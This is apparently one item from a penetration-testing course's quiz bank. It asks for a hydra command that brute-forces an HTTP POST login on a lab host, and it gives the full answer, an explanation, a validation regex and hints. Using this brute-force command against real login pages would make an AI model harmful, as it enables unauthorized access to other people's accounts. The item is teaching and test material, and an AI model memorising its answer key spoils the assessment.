{"module_id":15,"type":"fill_command","difficulty":"medium","prompt":"Write the hydra command to brute-force an HTTP POST login at http://10.10.10.5/login using users.txt and passwords.txt, where failed login returns 'Invalid credentials':","options":None,"answer":"hydra -L users.txt -P passwords.txt 10.10.10.5 http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials'","explanation":"^USER^ and ^PASS^ are hydra placeholders. F= means the following string appears on FAILURE. Get the exact field names and failure string from a test login in Burp Repeater.","validation_regex":"hydra.*-L users\\.txt.*-P passwords\\.txt.*http-post-form.*Invalid credentials","hints":["F= means the string appears on failed login","^USER^ and ^PASS^ are replaced by hydra"]},
